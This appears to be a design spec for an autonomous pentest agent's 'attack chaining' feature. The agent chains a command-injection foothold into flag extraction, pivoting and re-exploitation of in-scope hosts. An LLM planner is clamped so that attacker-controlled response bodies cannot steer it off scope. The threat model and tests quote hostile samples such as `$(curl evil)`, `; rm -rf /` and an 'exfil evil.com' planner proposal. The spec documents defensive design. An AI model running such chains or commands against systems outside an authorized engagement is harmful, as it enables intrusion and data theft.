# Attack chaining — autonomous exploitation chains (`aegis agent --chain`)

*Aegis milestone 26 (design). Clean-room, local-only. Builds on the red-team
engine stages 1–3 (`docs/specs/red-team-engine.md`) and the autonomous agent
(`docs/specs/autonomous-agent.md`, milestones 23–25).*

Status: **M26 built** (the design below is implemented and tested; see
"Implementation status" immediately after this paragraph). This spec was the
short design the STATUS follow-up asked for before building: *"the agent
actively chains attacks … offensive capability with real safety weight;
warrants a short design on scope + authorization model."* It composes chaining
on top of the existing read-only stage-1/2/3 primitives and the M24/M25 clamp
discipline. It adds **orchestration and typed artifact-passing, not new
offensive reach**; the one genuinely new capability it names (authenticated
re-triage, the `credential` role) is explicitly **deferred to M27** and is
*not* built here — the `credential` role is defined in the closed vocabulary but
never minted or consumed.

### Implementation status (milestone 26)

**Built and tested** (`aegis/redteam/chain.py`, wired into `aegis/agent.py` +
`aegis/cli.py`, offline/deterministic tests in
`aegis/tests/test_redteam_chain.py`):

* the chain data model — `Artifact` (closed `ARTIFACT_ROLES`; `meta` never
  serialized), `ChainStep`, `ChainGraph` (`as_dict` → `report.json`
  `metrics.agent.chain`), `ChainBudget`;
* the `CHAIN_OPS` registry (`confirm`/`extract`/`pivot`/`retriage`, each with
  `needs`/`produces`/`gate`; no destructive/write/exfil member);
* the derivation clamp — `clamp_op` (stage opt-in first), `derive_targets` +
  `match_trusted` (every derived target ∈ the frozen trusted set, never a body
  value), `clamp_choice` (planner only orders the code-built frontier),
  `build_trusted` (computed once from the frozen scope, never grows);
* the bounded, monotone BFS driver `run_chain` — per-step re-authorization on the
  exact target bytes, the re-feed of `engine.attempt`'s stage-2/3 output into
  discrete `extract`/`pivot` nodes (no new traffic, no re-plumbing), the
  promotion of a proven-reachable in-scope host to a re-triage → re-exploit node
  (depth ≥ 2), the full-chain audit, and the `max_depth = 0` flat-loop
  regression lock;
* the one-beat gate (`--chain` requires `--authorized` + `--scope` + `--exploit`,
  refused fail-closed with exit 2 before any traffic) and CLI budget flags.

**Deferred (not built):** M27 authenticated re-triage (`credential`), M28 SQLi
data-extraction / cross-path surface derivation, and everything under
"Permanently excluded".

## 1. Why — the gap today

`aegis agent` already drives recon → web → dast, triages into one knowledge
base, stops at the confirm-to-exploit gate, and — on `--exploit`/`go` — fires
stage-1 confirm probes at each auto-targetable lead. Its exploit step is a
**flat, independent, one-shot loop** (`agent.py`):

```python
for lead in outcome.exploitable_leads:
    authorize(scope, authorized, lead["target"])
    engine.attempt(lead["type"], lead["target"], lead["param"])
```

Each lead is attempted once, in isolation, and the run ends. `RedTeamEngine.attempt()`
*does* already run stage 2 (`postexploit.retrieve_flag`) and stage 3
(`lateral.move_laterally`) **inside a single call** when the foothold is a
sequence-capable `cmdi` and the scope opted in — so one `attempt()` already
performs a fixed confirm → extract → pivot *within one step*. What does **not**
exist is composition **across** steps: the artifacts a confirmed step produces
(a proven-reachable in-scope pivot host, a file naming an already-in-scope
surface) are never fed back to seed and justify a **new** step. There is no
dependency graph, no depth ≥ 2, no "this unlocked that."

Chaining is that missing piece: a bounded **attack tree** in which one confirmed
step's artifacts become the **preconditions/inputs** of the next, so the agent
can pursue a multi-step CTF/OSAI objective — foothold, then loot, then reach and
exploit the next in-scope box — instead of only scanning and firing isolated
probes.

The reason this needs a design and not just code: when steps chain, **later
targets and inputs are derived from earlier steps' output, and that output is
attacker-influenced** (it comes from the target under test). The central
question this document answers is how authorization survives that.

## 2. What chaining is — a worked example

A multi-step web CTF, scope declaring two in-scope hosts (`http://target.htb/`
and `http://inner.htb/`), with `allow_post_exploit` and `allow_lateral` set:

1. **confirm** — the dast phase flags a parameter on `http://target.htb/ping?host=`
   (CWE-78). `attempt("cmdi", …)` confirms it with the reflection-immune
   arithmetic oracle. Artifact: a **foothold** (sequence-capable cmdi).
2. **extract** — the foothold unlocks stage-2 read-only proof (the fixed
   allowlist `id` / `uname -a` / `cat <validated-path>`). `cat /app/README`
   yields a **file** artifact whose body mentions the already-in-scope admin
   surface `http://target.htb/admin/`; a later `cat /flag` yields a **flag**.
3. **pivot** — the same foothold unlocks stage-3 `move_laterally`, which proves
   `inner.htb` (one of the scope's own `urls`) reachable through the foothold.
   Artifact: a **host-reach** proof for an in-scope host.
4. **re-triage + re-exploit** — the proven-reachable in-scope host `inner.htb`
   (and the admin surface named in step 2) are promoted to **new nodes**:
   re-triage (re-scan an already-in-scope target) → a fresh finding → `attempt()`
   again → a new confirmed vuln, which can itself extract a second flag.

Each edge is "a confirmed parent produced the artifact this child consumes." The
whole thing is a dependency graph the operator authorized once, bounded in
depth/breadth/requests/time, every live action still triple-gated.

What is **not** in this example (deferred, §8): using an **extracted credential**
to reach a *new authenticated* surface. That is the one link that flows
attacker-influenced data into an outbound request as content, and it gets its
own milestone and design.

## 3. The chain data model

One new module, `aegis/redteam/chain.py`. All vocabularies are closed/enumerated;
no field is ever free model text.

### Artifact — the typed, untrusted output of a step

```python
ARTIFACT_ROLES = frozenset({
    "foothold",    # a confirmed sequence-capable cmdi (drives extract/pivot)
    "surface",     # an in-scope URL minted ONLY from a scanner-structured candidate
    "host_reach",  # an in-scope host proven reachable by move_laterally
    "file",        # a file body read by stage-2 (attacker-controlled DATA)
    "flag",        # a captured flag (terminal evidence)
    "credential",  # DEFERRED to M27 — not minted or consumed in M26
})

@dataclass(frozen=True)
class Artifact:
    role: str                 # one of ARTIFACT_ROLES
    value: str                # sanitize_text'd, length-bounded; opaque
    origin_step: str          # the step id that produced it
    meta: dict = field(default_factory=dict)   # ENGINE-INTERNAL (e.g. cmdi
                              # template); NEVER serialized to planner/transcript/report
```

Every `Artifact` is **untrusted/attacker-influenced data**. Its `role` fixes
which position it may ever flow into (see §5). An artifact can seed a hypothesis;
it can never *by itself* authorize an action, become a target/command/arg, or
enter the scope.

### ChainStep / ChainNode

```python
@dataclass
class ChainStep:
    id: str                   # deterministic "c{depth:02d}-{seq:03d}"
    op: str                   # key into CHAIN_OPS: "confirm"|"extract"|"pivot"|"retriage"
    target: str               # ALWAYS a member of the trusted set (see §5)
    param: str = ""
    inputs: tuple             # consumed Artifacts, role-checked
    depth: int = 0
    parent_id: Optional[str] = None
    status: str = "pending"   # pending|refused_scope|refused_derivation|
                              # attempted|confirmed|unconfirmed|capped|skipped_dup
    requests: int = 0
    produced: list            # Artifacts this step minted
    result: Optional[dict]    # ExploitResult.as_dict() / PostExploitResult / LateralResult
    note: str = ""
```

### ChainGraph

```python
@dataclass
class ChainGraph:
    nodes: dict               # id -> ChainStep
    edges: list               # (parent_id, child_id) — the dependency tree
    frontier: list            # pending step ids, BFS order (depth, then discovery)
    seen: set                 # dedup keys (op, target, param, roles-of-inputs)
    trusted: tuple            # the CLOSED set, computed ONCE at start, frozen
    budget: ChainBudget
    discovered_refused: list  # out-of-scope hypotheses: logged, never acted on
    def as_dict(self) -> dict # full tree -> report.json metrics.agent.chain
```

### ChainBudget — all code/operator-owned, never planner-influenced

```python
@dataclass
class ChainBudget:
    max_depth: int = 0        # DEFAULT 0 ⇒ degenerate to today's flat loop
    max_breadth: int = 4      # children promoted per node (also ≤ scope.max_hosts)
    max_steps: int = 16       # total nodes; excess logged "capped", never dropped
    max_requests: int = 512   # summed across steps — hard anti-DoS wall
    deadline: Optional[float] = None  # min(wall-clock cap, scope.expires)
```

`--chain` sets a budget with `max_depth ≥ 1`. **Without `--chain`, `drive_agent`
runs today's flat loop unchanged**; with `max_depth = 0` the orchestrator is
byte-for-byte equivalent to that loop (a regression lock, §9).

### Frontier expansion and termination

The frontier is a **code-built** BFS worklist of candidate steps. A candidate is
admissible iff: (1) its `op` is a `CHAIN_OPS` key whose stage the operator opted
into (`clamp_op`); (2) its required input artifacts exist on a confirmed
ancestor; (3) its `(target, param)` was produced by `derive_targets` — a trusted
source, scope-re-checked — not from a response body; (4) `depth < max_depth`;
(5) its dedup key is not in `seen`. `run_chain` pops an admissible step,
re-authorizes, dispatches to the existing primitive, folds its typed artifacts
back, re-derives the frontier, and repeats.

**Termination is provable.** Every attempted step consumes a unique dedup key
from a finite space (finite ops × finite trusted targets × finite input-role
sets); `seen` makes the frontier **monotone** (an artifact can unlock new keys
but never re-enable an identical one, breaking cycles where A reveals B reveals
A); and `max_steps`/`max_requests`/`deadline` are independent hard caps. The
loop halts on an empty frontier or any bound.

## 4. The scope + authorization model under chaining — the centerpiece

**Claim:** a chain can never be steered outside the operator-declared engagement
scope, escalate its own authority, or take a destructive/persistent action —
*even when a step's inputs are chosen from data the target returned.* The claim
rests on facts chaining does not touch, argued point by point.

**(1) Scope is a frozen, operator-declared, immutable datum.**
`EngagementScope` is `@dataclass(frozen=True)`, loaded once by `load_scope` and
held by the chain driver (a `run_chain` parameter), exactly as `drive_agent`
holds it today. **There is no method anywhere that mutates a scope** — not on the
happy path, not in any op, not in any clamp. "Scope never auto-expands" is
therefore not a check that could be bypassed; it is a property of there being no
mutator at all. A test asserts the scope object is identical and value-equal
before and after an arbitrarily hostile chain.

**(2) The trusted target set is closed and computed once from that frozen scope.**
`ChainGraph.trusted` is built at chain start from operator data only — the
scope's own in-scope `urls`/`hosts`, plus scanner-structured in-scope candidate
components — each re-checked with `scope.is_in_scope`. It is **never recomputed
from an artifact and never grows**. An artifact can only ever *select* a member
of this set; it can never *add* one. This is `lateral.py`'s existing rule
("discovery only ever adds evidence and refusals, never new targets")
generalized to the whole chain.

**(3) Two independent gates fire on the exact bytes, per live action, at every
depth.** Chaining introduces **no new network path**. Every step's wire traffic
goes through `RedTeamEngine` → `ScopeGatedTransport(inner, scope)`, which calls
`scope.check(full_url)` on the exact bytes and refuses before the socket; and the
chain driver re-calls `authorize(scope, authorized, step.target)` before each
dispatch, exactly as `drive_agent` does per lead today. Expiry is re-evaluated in
every `check()`, so a chain crossing `scope.expires` mid-run fails closed on the
remaining steps (and `ChainBudget.deadline = min(wall-clock, scope.expires)`
stops the loop).

**(4) The planner never receives `scope`/`authorized` and can only emit a
key/index.** As in M24/M25, authorization state lives only in the driver. The
planner's entire output vocabulary under chaining is: pick-next-op
(`clamp_op` → a `CHAIN_OPS` key gated by stage opt-in) and order-the-frontier
(`clamp_choice` → an index into the **code-built** frontier). It never authors a
target, param, command, credential, or scope entry. Offline/`static`/`TemplateLLM`
runs the deterministic BFS frontier with no planner at all.

**(5) Extracted data seeds a hypothesis; it never authorizes.** A value lifted
from a response body becomes an untrusted `Artifact`. Turning it toward action is
a strict two-phase move: (a) **hypothesize** — classify its role by a code-owned
pattern; (b) **authorize** — `derive_targets` resolves it to a *member of the
trusted set* (operator bytes), then `authorize()` + `scope.check()` run on those
operator bytes. The artifact's bytes are never the target; they only ever
*match* a pre-existing in-scope entry, and the operator's bytes are what runs.
So attacker output can influence **which** in-scope action runs, never **whether**
an out-of-scope action can run.

**(6) Stage escalation stays operator-opt-in and inherited, never planner-set.**
`clamp_op` returns an `extract` op only if `scope.allow_post_exploit`, a `pivot`
op only if `scope.allow_lateral` (bounded by `scope.max_hosts`), each checked
**first** — the same way `clamp_depth` checks `active_allowed` first. These
switches are read from the frozen scope the loop never holds, so a chain can
never flip its own stage.

### Traced hostile example (refused)

Step `c00-000` confirms `cmdi` on `http://target.htb/` (in scope). The target's
response body — fully attacker-controlled — contains:

- an off-site URL `http://evil.com/admin?x=1`,
- an injected pseudo-config string `deny: [] ; hosts: evil.com`,
- a `cat /etc/hosts` line `10.0.0.9  evil.com`.

A hostile planner proposes `op="exfil evil.com"`, `target="http://evil.com/"`.

- `clamp_op("exfil …")` → not a `CHAIN_OPS` key → `None` → step dropped
  (fail-closed). Even a legitimate `op="pivot"` gets its targets from
  `derive_targets`, which draws from `scope.urls`/`trusted` only — `evil.com` is
  not there, so it is never produced.
- The `/etc/hosts` token `evil.com` surfaces as a `host_reach` *hypothesis*;
  `move_laterally` already records it in `refused_out_of_scope`
  ("seen, refused, not touched") because `_host_in_scope("evil.com")` is false,
  and the scope is unchanged.
- The `deny: … hosts: …` string is inert body text. **No code parses a response
  body into scope.**
- If a hypothetical derivation bug nonetheless produced
  `target="http://evil.com/"`, `authorize()` refuses it, and `ScopeGatedTransport`
  refuses it again on the exact bytes — nothing reaches the wire.
- The scope object is byte-for-byte identical before and after.

If the body instead carried `; rm -rf /` or `$(curl evil)`: there is **no
free-form command sink anywhere in the chain**. The only command execution is
stage-2's fixed allowlist (`id` / `uname -a` / `cat <path matching
\A[A-Za-z0-9_./-]+\Z>`), reached only under `allow_post_exploit`; the injected
string can only ever be `sanitize_text`'d response *data*, never interpolated
into a command, target, or scope.

Net: a chain has **strictly less** authority than an operator re-running `aegis
agent` by hand against each declared target — every step passes the identical
gates, and the trusted set is a subset of the operator's own scope.

## 5. The derivation clamp — deriving next-step targets safely

This is the one load-bearing new control, and it is the direct generalization of
`clamp_phases`/`clamp_depth`: **the planner (or an artifact) proposes; a pure
clamp over a trusted finite set the caller owns disposes; fail-closed.** Three
pure, no-I/O functions.

### `clamp_op(proposed, scope) -> Optional[str]`

```python
allowed = tuple(k for k, op in CHAIN_OPS.items() if op.gate(scope))
# op.gate reads scope.allow_post_exploit / allow_lateral — stage opt-in FIRST.
```

A `str` proposal is a case-folded membership test against `allowed`; an `int`
(not `bool`) is an index into `allowed`; anything else → `None`. Mirrors
`clamp_phases` exactly (bool rejected as index, no char-iteration of a bare
string). The planner can never introduce an op, or an op whose stage the operator
did not enable.

### `derive_targets(op, parent_step, scope, trusted) -> list[(target, param, inputs)]`

The trust boundary for the **target itself**. Code — not the planner, not a
response body — builds candidate `(target, param)` pairs, each from a trusted
source and each re-checked with `scope.is_in_scope` before admission:

- `op == "confirm"`: targets are `surface` artifacts whose `value` is a
  **scanner-structured** candidate component that is an http(s) URL **and**
  `scope.is_in_scope(value)` — the exact discipline `attemptable()` uses today.
  `param` is structured `metadata['param']` or the URL query, never body text.
- `op == "extract"`: target/param are the parent **foothold's own already-
  confirmed-in-scope** `(target, param)`; **no new target is introduced**.
  `inputs = (foothold,)`. Reuses `postexploit.retrieve_flag` over its fixed
  allowlist.
- `op == "pivot"`: targets are `scope.urls` filtered by `scope.is_in_scope` and
  `_safe_url`, exactly as `move_laterally` does today; discovered host tokens
  never become targets, only `host_reach` evidence.
- `op == "retriage"`: target is a `host_reach`/`surface` artifact resolved to a
  member of `trusted` via `match_trusted` (below); it re-runs the gated scanners
  against an **already-in-scope** host to find fresh surface. (The scan-egress
  caveat applies — §6, §10.)

The one chokepoint, and the property the tests pin:

```python
def match_trusted(candidate_host, trusted) -> Optional[str]:
    # Returns the TRUSTED element whose canonical host (scope._canon_host)
    # equals the candidate's — NEVER returns its argument. Like clamp_phases
    # returns allowed[i]/lut[key], never the proposed token.

# Final gate inside derive_targets:
return [c for c in built
        if c.target in set(trusted)             # provable set membership
        and scope.check(c.target).in_scope      # exact-bytes re-check
        and (c.op, c.target, c.param, roles(c.inputs)) not in seen]
```

**Invariant (test-enforced over all inputs, including hostile):** every returned
`target` is an element of `trusted` — byte-identical to operator-declared data,
never a substring/transform of a response body.

The transformations allowed on an attacker-controlled extracted value are
deliberately minimal and **non-authoring**: (a) pattern-classify its role (e.g.
`_FLAG_RX` → `flag`; an `/etc/hosts` token → `host_reach` hypothesis); (b)
membership-test it against an **existing** trusted set (`lateral.py`'s rule); or
(c) carry it as opaque terminal evidence. A value is **never** concatenated or
formatted into a URL, shell command, argv, or scope entry.

### `clamp_choice(proposed, frontier) -> Optional[ChainStep]` (optional)

The frontier is a code-built list of already-vetted, scope-checked candidates. A
planner `int` indexes it; a `str` matches a dedup key; anything else → `None`.
So even "which to pursue next" is a selection among code-vetted options, never
free text. Offline, the deterministic BFS order needs no planner.

**The known footgun (carried from the `clamp_phases` note in `agent.py`):** the
guarantee is only as strong as the trusted sets being code/operator-owned.
`CHAIN_OPS` is a module constant; `trusted` is derived from operator scope data.
A future caller must **never** pass a planner-derived value as the op set or as a
`derive_targets` source. A unit + property test pins this.

## 6. The safety envelope

**Human beat — one beat for the whole bounded chain.** The beat sits exactly
where today's confirm-to-exploit gate sits (`--exploit` headless / typed `go` in
the shell), *before any payload*. Rationale, consistent with "a human beat before
payloads" and with the chain being provably bounded: per-step prompts add no
security (every step is independently double-gated and can only run a read-only
primitive) and would make unattended CTF/OSAI solving impossible; the bound that
matters is set once, before the run. Stage-2/3 escalation inside the chain needs
no extra interactive beat because the operator already opted in per stage via the
scope file (`allow_post_exploit`, `allow_lateral`+`max_hosts`). The beats are
therefore: `--authorized` + `--scope` (gate all live traffic), the per-stage
scope switches (gate stages 2/3), and the single `--chain`/`go` beat (gate
payload sending). An optional stricter `--chain-step-confirm` mode (prompt on
first stage escalation) is a decision pending (§10), not the default.

**Prohibitions (unchanged, inherited, enforced *because chaining adds no new
primitive*):** no destructive actions, no persistence/backdoors, no
detection-evasion, no credential exfiltration beyond in-scope proof. `extract` is
the fixed read-only allowlist; `pivot` is read-only `curl` to scope hosts
(single-quoted, `_safe_url`-validated); `confirm` is the verify-only oracles.
`STEP_KINDS`/`CHAIN_OPS` is a closed set with **no destructive or write member**.
The chain only sequences these.

**Bounds:** `max_depth`, `max_breadth`, `max_steps`, `max_requests` (code
constants), `scope.max_hosts` (operator), hard `scope.expires` (re-checked every
step), transport timeout/byte caps per request, and the monotone-frontier +
finite-dedup-key termination proof.

**Full-chain audit.** Every step and decision emits to the existing `EventSink`
(`sink.emit`, codes alongside the current `a0001`/`a0003`) and lands in
`report.json` under `metrics.agent.chain = ChainGraph.as_dict()` — nodes, edges,
each per-step `ScopeDecision`, every `derivation_refused`, every out-of-scope
host "seen, refused", and every `capped`. New event kinds: `chain_start`,
`chain_node_open`, `derivation_refused`, `chain_edge`, `chain_node_result`,
`chain_capped`, `chain_done`. So the whole attack tree — including every refusal
— is reconstructable, and the "no auto-expand" guarantee is visible, matching the
stage-1/2/3 audit contract. Extracted values are `sanitize_text`'d at every
artifact mint and every terminal/evidence boundary; the cmdi foothold template
(and any future credential) lives only in `Artifact.meta` and is **never**
serialized to the planner, transcript, or report.

## 7. Reuse + exactly what is new

**Reused as-is (no change):**

- `EngagementScope` + `check`/`is_in_scope`/`is_expired`/`_canon_host` (`scope.py`)
  — the sole authorization datum/question.
- `authorize()` (`shell.py`) — re-checked per step by the driver.
- `RedTeamEngine.attempt()` (`engine.py`) — the `confirm` op; it already runs
  stage 2/3 internally and returns `ExploitResult.post_exploit`/`.lateral`, so
  chaining re-feeds those artifacts rather than re-plumbing stages. Reuses the
  `ScopeGatedTransport` wiring verbatim.
- `postexploit.retrieve_flag`/`run_command`/`valid_flag_path` — the `extract` op.
- `lateral.move_laterally`/`discover_hosts`/`_in_scope_url_hosts`/`_safe_url`/
  `_HOST_TOKEN` — the `pivot` op, including its "discovered → hypothesis only,
  acted on only if already in scope" split (the template for the whole clamp).
- `attemptable()` + `technique_for` + `ALL_TECHNIQUES` (`agent.py`/`techniques.py`)
  — turn a (re-)scanned in-scope finding into a `(type, target, param)` lead.
- `run_narration`/`fold_findings`/`_finding_key` (`shell.py`) — `retriage`.
- `sanitize_text` (`http.py`); `EventSink.emit` + the `report.json`/`metrics.agent`
  shape; the M24/M25 clamp discipline (`clamp_phases`/`clamp_depth`) as the
  pattern; `AgentOutcome`'s SCAN/TRIAGE/GATE structure.

**New (small, additive):**

- `aegis/redteam/chain.py`: `Artifact`/`ChainStep`/`ChainGraph`/`ChainBudget`;
  the `CHAIN_OPS` registry (thin wrappers over the three primitives, each with
  `needs`/`produces`/`gate`); the pure clamps `clamp_op`/`clamp_choice`/
  `derive_targets` + `match_trusted`; and the bounded BFS driver
  `run_chain(scope, authorized, transport, engine, scanner_fn, initial_leads,
  budget, planner=None, sink, write)`.
- `aegis/agent.py`: `AgentOutcome` gains a `chain: dict` field; the flat exploit
  loop is replaced by a call to `run_chain` when `--chain` is set (with
  `max_depth=0` this is today's loop byte-for-byte; the flat loop stays the
  default when `--chain` is absent).
- `aegis/llm.py`: an optional `plan_chain_step()` (one generative call → clamp →
  fail-closed), mirroring `plan_phases`/`plan_depth`.
- CLI/shell: a `--chain` flag (requires `--authorized` + `--scope` + `--exploit`;
  refused with exit 2 before any traffic otherwise). No new network code, no new
  command sink, no new scope surface.

## 8. Milestone decomposition (honest scope)

**M26 — DONE (built + tested). The smallest genuinely-chaining, buildable now,
zero new offensive reach.** The chain engine + `ChainGraph`/`Artifact`/`ChainStep`/`ChainBudget` +
`clamp_op`/`clamp_choice`/`derive_targets` + the bounded monotone frontier + the
one-beat gate + the full audit, composing **only** `confirm → extract → pivot →
re-triage/re-exploit-of-an-already-in-scope-target** over the existing read-only
primitives. The genuine new behavior over today's one-shot loop: a confirmed
`cmdi` foothold **unlocks** both `extract` (flag/file artifacts via the fixed
allowlist) and `pivot` (in-scope hosts), and a **proven-reachable in-scope pivot
host is promoted to a first-class node** that can itself be re-triaged and
re-exploited (depth ≥ 2) — a real multi-step attack tree that solves "foothold
then loot then reach and own the next in-scope box," which is most
non-authenticated CTF chains. It adds **no new reach**: every target was already
operator-declared and already directly attackable; the chain only *justifies and
sequences* attacking it. Fully offline/fixture-testable.

**M27 (deferred, named — the genuinely new reach): authenticated re-triage.** A
`credential` artifact (extracted read-only, in-scope) is supplied as an **auth
input** (header/cookie/form value) to a re-triage scan of an **already-in-scope**
target, reaching a new *authenticated* surface. This is the full "SQLi →
credential → authenticated surface → re-triage → exploit" link. It is the **only**
path that flows an attacker-influenced extracted value into an outbound request
as content, so it needs its own safety treatment (credential bound to the exact
in-scope host it was extracted from; redacted everywhere; never a target or
command; re-triage fan-out bounded) and its own milestone. **It must not be
smuggled into M26.**

**M28 (deferred, named): bounded SQLi data-extraction stage-2** (today's SQLi is
verify-only) and/or cross-path surface derivation under an in-scope URL prefix.

**Permanently excluded (invariants, not milestones):** any op that lets an
extracted value *become* a new target/host/command/scope entry; any write/
persistence/destructive/evasion op; any scope mutation; **free-form
model-authored targets/args/commands** (the standing deferral — stays deferred);
multi-tool-per-phase re-scan (live adapters are still 1:1 per phase — a no-op
today). These are reach, not chaining; the design's job is to make them
impossible by construction, not to ship them.

## 9. Offline/deterministic test strategy

Everything offline, no live target, mirroring the existing `FakeTransport` +
fake-scanner fixtures.

- **Clamp unit tables** (like `test_clamp_phases`): `clamp_op` over a grid of
  `{str, int, bool, float, None, list, dict, injection-string}` ×
  `{scope with/without each stage switch}` → always a `CHAIN_OPS` key whose stage
  is opted-in, or `None`; never an out-of-set op, never a disabled stage.
  `clamp_choice` over random indices/garbage → always a frontier member or
  `None`.
- **Derivation property test** (the trust boundary): for arbitrary artifact dicts
  and arbitrary (fixed-set) response bodies, **every** `derive_targets` result
  `target ∈ trusted`, and no `target` is a substring/transform of a body not
  already in `trusted`; `match_trusted` never returns its argument.
- **Fixture chains (end-to-end):** a `FakeTransport` scripted by `(method, url,
  params) → HttpResponse` encodes confirm `cmdi` on `target.htb` → `extract`
  reads a planted `/flag` + a file naming in-scope `inner.htb` → `pivot` proves
  `inner.htb` reachable → re-triage/re-exploit `inner.htb` yields a second flag.
  Assert the expected `ChainGraph` edges, both flags, and request count within
  `max_requests`.
- **Hostile-output fixtures (the core safety proof):** bodies contain an
  out-of-scope absolute URL, an injected `deny/hosts: evil.com` string, a fake
  credential, and an `/etc/hosts` line for `10.0.0.9 evil.com`; drive with a
  **hostile fake planner** proposing out-of-set ops and indices aimed at
  `evil.com`. Assert: `FakeTransport` received **zero** sends to `evil.com`
  (each attempt recorded as a refusal); the scope object is identical and
  value-equal before == after; **no** `ChainStep.target` is a value lifted from a
  body (every target ∈ `trusted`); `evil.com` recorded "seen, refused, not
  touched"; the chain terminated within `max_steps`/`max_depth`.
- **Bounds/termination:** a cyclic fixture (A reveals B reveals A) terminates via
  `seen` + `max_depth`; `max_breadth`/`max_steps`/`max_requests`/`deadline` each
  independently halt with `status="capped"` and no further successors; a scope
  expiring mid-chain refuses the remaining frontier.
- **No-new-sink:** a body carrying `; rm -rf /` / `$(…)` asserts stage-2 still
  runs only the fixed allowlist and the string appears only as `sanitize_text`'d
  data; a flag path with shell metacharacters is rejected by `valid_flag_path`.
- **Audit completeness:** `report.json` `metrics.agent.chain` reconstructs the
  full tree (nodes, edges, every `derivation_refused`, every refused host, every
  cap).
- **Regression:** `drive_agent` without `--chain` (and `run_chain` with
  `max_depth=0`) is byte-for-byte today's flat-loop output; `--chain` without
  `--authorized`/`--scope`/`--exploit` is refused (exit 2) before any traffic;
  unauthorized → offline narration, chain never runs; stage switches off →
  `extract`/`pivot` successors are never created even when a foothold confirms.
  All tests run under `--mode static` (no planner); a fake-provider test covers
  `clamp_choice`/`plan_chain_step` when the optional planner path is built.

## 10. Open questions + decisions pending

- **Authenticated re-triage (M27):** exactly where a `credential` artifact flows
  into the outbound request (header vs cookie vs form), how it is bound to only
  the in-scope host it was extracted from, and how it is redacted in
  transcript/`report.json` so chaining never becomes a credential-exfiltration
  path. *Decision: a driver-held secret store keyed by artifact id, redacted in
  all audit output; concrete redaction contract TBD. Out of M26.*
- **One beat vs per-escalation beat:** is a single `--chain`/`go` approval for the
  whole bounded chain acceptable, given each step is independently scope-gated and
  the stage switches already encode operator intent? *Proposed decision: one beat
  by default + an optional stricter `--chain-step-confirm` mode.*
- **Re-triage cost/egress:** per-node live re-scan is expensive, loud, and
  inherits the known "scan container egress gates only the seed" limitation
  (a re-scan of an in-scope host could spider to an out-of-scope host at the
  container level; `attempt` re-checks every request, scanners do not).
  *Proposed decision: M26 prefers promoting proven reachability and re-exploiting
  via `attempt()`; offline uses the fixture/`FakeTransport` seam, with live
  re-scan the operator's step. A narrowed phase set for discovered paths, and the
  per-request scope-enforcing egress proxy (already a named deferral), are the
  real fixes.* Confirm the fixture seam shape.
- **URL-prefix reach:** scope URL-prefix matching auto-admits any path under an
  in-scope prefix; chaining reaches deeper into a host than a single probe. Do we
  want an optional per-chain path-depth/request budget beyond `max_requests`, or
  is narrow operator scoping + the full audit sufficient? *Leaning: bounds +
  audit + guidance to scope narrowly.*
- **Dedup key:** is `(op, target, param, input-roles)` sufficient, or do distinct
  extracted inputs at the same `(op, target, param)` constitute distinct steps?
  *Leaning sufficient for M26 (no credentialed inputs yet); revisit at M27.*
- **Artifact retention:** should file/flag/credential artifacts be dropped from
  memory after the consuming step and never written to `report.json` beyond a
  redacted proof line? *Leaning yes for file/credential; flags kept as terminal
  evidence.*
- **Graph presentation:** a new attack-tree dashboard view for `ChainGraph`, or
  does folding into the existing transcript/agent-graph suffice for M26?
  *Leaning: reuse the existing transcript for M26; a dedicated view is polish.*

---

### Risks (carried into the build)

- **Authenticated re-triage is the single highest-risk feature** — a mishandled
  extracted credential could reach a wrong in-scope endpoint or be logged. Keep it
  out of M26; give it a dedicated design.
- **Trusted-set footgun** (flagged for `clamp_phases` in `agent.py`): a future
  caller passing a planner-derived value as the `CHAIN_OPS` set or a
  `derive_targets` source collapses the whole "cannot author a target/op"
  guarantee. Mitigate with the documented invariant + a test that the sets are
  code/operator-owned constants.
- **Scan-egress amplification** under per-node re-scan — see §10; M26 avoids it.
- **Over-trusting a `surface` artifact:** a surface URL must be minted **only**
  from a scanner-structured candidate component (and re-checked `is_in_scope`),
  never from parsed body text — else it would be attacker-authored. Enforce by
  construction.
- **Frontier explosion / non-termination** if the dedup key or breadth cap is
  wrong. Mitigate with the monotone frontier + finite dedup-key space + hard
  `max_steps`/`max_requests`, proven by a termination test.
- **Transcript/log injection** from deep-chain attacker output — mitigate with
  `sanitize_text` at every new artifact mint and evidence boundary.
- **Seam regression** — the `max_depth=0` byte-for-byte regression lock guards
  today's single-shot behavior.
